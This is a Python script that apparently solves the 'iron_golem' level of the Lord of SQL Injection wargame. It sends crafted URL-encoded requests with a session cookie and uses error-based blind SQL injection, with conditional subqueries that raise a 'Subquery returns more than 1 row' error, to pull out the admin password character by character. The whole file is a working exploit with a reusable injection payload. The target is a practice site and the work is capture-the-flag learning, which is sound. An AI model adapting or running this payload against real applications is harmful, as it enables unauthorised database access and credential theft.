import requests
import string

url = "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php?pw="
cookies = {'PHPSESSID':'sgn0mh5v9ula944agqskgevh9i'}
for j in range(1,33):
    for i in range(0,123):
        
        url="https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php?pw=1%27||id=%27admin%27%20and%20(if(ord(substr(pw,"+str(j)+",1))=%22"+str(i)+"%22,(select%201%20union%20select%202),1))--%20-"
        res = requests.get(url,cookies=cookies)
        res = res.text
        if "Subquery returns more than 1 row" in res:
            print("%d : %c" % (j,chr(i)))
            break
        else: pass